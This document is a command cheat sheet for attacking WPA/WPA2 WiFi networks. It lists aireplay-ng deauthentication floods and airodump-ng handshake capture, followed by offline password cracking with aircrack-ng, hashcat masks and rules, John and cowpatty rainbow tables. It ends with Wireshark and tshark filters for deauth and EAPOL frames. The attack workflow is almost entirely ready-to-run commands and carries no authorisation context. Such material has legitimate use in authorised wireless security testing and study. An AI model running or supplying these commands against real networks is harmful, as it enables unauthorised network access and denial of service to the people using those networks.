## WPA/WPA2 Cracking

### Capture Handshake
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wpa wlan0mon             # Capture handshake
aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon                  # Deauth clients

### Verify Handshake
aircrack-ng wpa-01.cap                                                 # Check for handshake
cowpatty -r wpa-01.cap -s ESSID                                        # Verify with cowpatty

### Dictionary Attack
aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 wpa-01.cap            # Dictionary attack
aircrack-ng -w wordlist.txt wpa-01.cap                                 # Auto-detect network

### WPA Cracking with Hashcat
hcxpcaptool -z hash.hc22000 wpa-01.cap                                 # Convert to hashcat format
hashcat -m 22000 hash.hc22000 wordlist.txt                             # Hashcat WPA/WPA2
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule        # With rules
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d                    # Mask attack (8 digits)

### WPA Cracking with John
hccap2john wpa-01.cap > hash.john                                      # Convert to john format
john --wordlist=wordlist.txt hash.john                                 # Crack with john

### Cowpatty
cowpatty -r wpa-01.cap -f wordlist.txt -s ESSID                        # Dictionary attack
cowpatty -r wpa-01.cap -d hashfile -s ESSID                            # Rainbow table
genpmk -f wordlist.txt -d hashfile -s ESSID                            # Generate rainbow table

## 802.11 Frame Analysis

### Wireshark Filters
wlan.fc.type == 0                                                      # Management frames
wlan.fc.type == 1                                                      # Control frames
wlan.fc.type == 2                                                      # Data frames
wlan.fc.type_subtype == 0x08                                           # Beacon frames
wlan.fc.type_subtype == 0x0c                                           # Deauth frames
eapol                                                                  # EAPOL handshake

### tshark WiFi Capture
tshark -i wlan0mon -w capture.pcap                                     # Capture
tshark -r capture.pcap -Y "wlan.fc.type_subtype == 0x0c"               # Filter deauth
tshark -r capture.pcap -Y "eapol"                                      # Filter EAPOL
